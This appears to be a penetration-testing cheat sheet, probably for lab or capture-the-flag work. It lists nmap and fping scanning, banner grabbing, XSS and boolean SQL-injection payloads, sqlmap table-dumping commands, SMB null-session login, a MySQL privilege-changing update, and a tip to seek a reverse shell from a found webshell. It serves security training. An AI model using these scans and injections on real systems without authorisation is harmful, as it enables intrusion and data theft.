# Cheat Sheet

This cheat sheet is a list of commands to help with the black box
pen test engagements. 

## Networking

### Check route

```
$ route
```
### Manually add a route

```
$ ip route add 192.168.10.20/24 via 10.175.3.1
```

### Check DNS

```
$ nslookup mysite.com
```

## Information Gathering

### Subdomain Enumeration

- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [DNSdumpster](https://dnsdumpster.com/)

## Footprinting & Scanning

**Check which hosts in a network are up:**
```
$ fping -a -g 172.16.100.40/24 2>/dev/null | tee alive_hosts.txt
```

**nmap stealth SYN scan:**
```
$ nmap -sS target.com
```

**nmap TCP connect scan:**
```
$ nmap -sT target.com
```

**nmap port scan:**
```
$ nmap -sn target.com
```

**nmap service scan:**
```
$ nmap -sV target.com
```

**nmap OS detection:**
```
# nmap -O target.com
```

### Spotting a Firewall

If an nmap TCP scan identified a well-known service, such as a web server, but
cannot detect the version, then there may be a firewall in place.

For example:
```
PORT    STATE  SERVICE  REASON          VERSION
80/tcp  open   http?    syn-ack ttl 64
```

Another example:
```
80/tcp  open   tcpwrapped 
```

**"tcpwrapped"** means the TCP handshake was completed, but the remote host
closed the connection without receiving any data. 

These are both indicators that a firewall is blocking our scan with the target!

Tips:
- Use "--reason" to see why a port is marked open or closed
- If a "RST" packet is received, then something prevented the connection - probably a firewall!

### Masscan
Masscan is designed to scan thousands of IP addresses at once.


## Vulnerability Assessment

- Searchsploit
- ExploitDB
- Msfconsole search command
- Google
- Nessus

## Web Attacks

### Web Server Fingerprinting

Use netcat for banner grabbing:
```
$ nc <target addr> 80
HEAD / HTTP/1.0


```

Use OpenSSL for HTTPS banner grabbing:
```
$ openssl s_client -connect target.site:443
HEAD / HTTP/1.0


```

httprint is a web fingerprinting tool that uses **signature-based** technique
to identify web servers. This is more accurate since sysadmins can customize
web server banners.

```
$ httprint -P0 -h <target hosts> -s <signature file>
```

### Directory and File Enumeration
- Gobuster
- Dirbuster
- Dirb

### XSS

Look to exploit user input coming from:
- Request headers
- Cookies
- Form inputs
- POST parameters
- GET parameters

Find an XSS attack by entering:
- <script>alert(1)</script>
- <i>some text</i>

Steal cookies:
- <script>alert(document.cookie)</script>

### SQL Injection

Boolean Injection:
- and 1=1; -- -
- or 'a'='a'; -- -


Use sqlmap to automate:
```
$ sqlmap -u <url>
```

Get a list of tables:
```
$ sqlmap -u <url> --tables
```

Dump all data from a given table:
```
$ sqlmap -u <url> -D <database name> -T <table name> --dump
```

### Windows Shares Enumeration


### SMB Null Attack
Try to login without a username or password:

```
$ smbclient //share -N
```

## MySQL commands

Login to MySQL with password
```
$ mysql --user=root --port=13306 -p -h 172.16.64.81
```

Show databases:
```
> SHOW databases;
```

Select a database to use:
```
> USE <database name>;
```

Change an items value for a given user:
```
# Add the user tracking1 to the "adm" group
> update users set adm="yes" where username="tracking1";
```

## Misc

Found a webshell/admin panel on a site?
- Run phpinfo(); to determine if it is a PHP shell
- Try to get a reverse shell connection
- Check for flag in /home or /var/www
